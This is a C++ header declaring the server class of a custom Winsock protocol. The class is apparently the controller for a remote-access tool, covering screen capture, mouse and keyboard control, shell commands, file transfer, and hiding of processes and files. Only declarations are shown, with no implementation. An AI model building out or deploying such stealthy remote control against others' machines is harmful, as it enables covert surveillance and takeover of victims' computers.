#include "MLHT.h"
#include <stdio.h>

#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH+1)


//报文接收返回值
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1

#define FILE_OPEN_FAIL			2
#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4

#define OP_SUCCESS				5
#define OP_FAIL					6

#define NOT_GET_ACK				7
#define GET_ACK					8

#define FILE_TOO_LARGE			9

#define SOMETHINGWRONG			-2


class MLHT_SERVER
{
public:
	//监听socket
	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	int server_port;//服务器监听端口

	//客户端socket
	SOCKADDR clientAddr;
	SOCKET clientsocket;

	char buffer[MLHT_MAX_LENGTH];
	
	WORD IDtt;	 //记录发包数量
	
	MLHT *p_send;//上一个发出的报文
	MLHT *p_get; //上一个收到的报文

public:
	MLHT_SERVER(int port);			//初始化服务端
	
	void WaitForClient();			//等待客户端连接
	
	int WaitReturnPacket();			//等待返回报文，检测返回报文是否合法
	int WaitForAckPacket();			//等待ACK返回报文

	void SendPacket(WORD mtu_type);	//发无参数报文
	void SendACKPacket();			//发ACK返回报文
	void SendFINPacket();			//发FIN返回报文
	void SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength);//发带参数报文

	bool IsAckPacket();
	bool IsFinPacket();
	bool IsReturnPacket();

	//传输文件包
	int SendFilePacket(
		WORD mtu_type,				//文件操作协议类型
		FILE *fp,					//文件指针
		int contentlen				//文件长度
		);

	//接收文件包
	int GetFilePacket(
		FILE *fp				//保存目标文件的指针
		);
	
	///远程桌面操作
	int GetScreenshoot();
	void GetMouseOperate();
	void GetKeybroadOperate();
	
	//进程操作
	void GetProcessHide();
	void GetProcessShow();

	//文件操作
	void GetFileHide();
	void GetFileShow();

	//Shell操作
	bool GetShellLs();
	bool GetShellMkdir();
	bool GetShellRmdir();
	bool GetShellRm();
			
	int GetUploadFile();			//接收上传文件
	int SendDownloadFile();			//发送下载文件


 };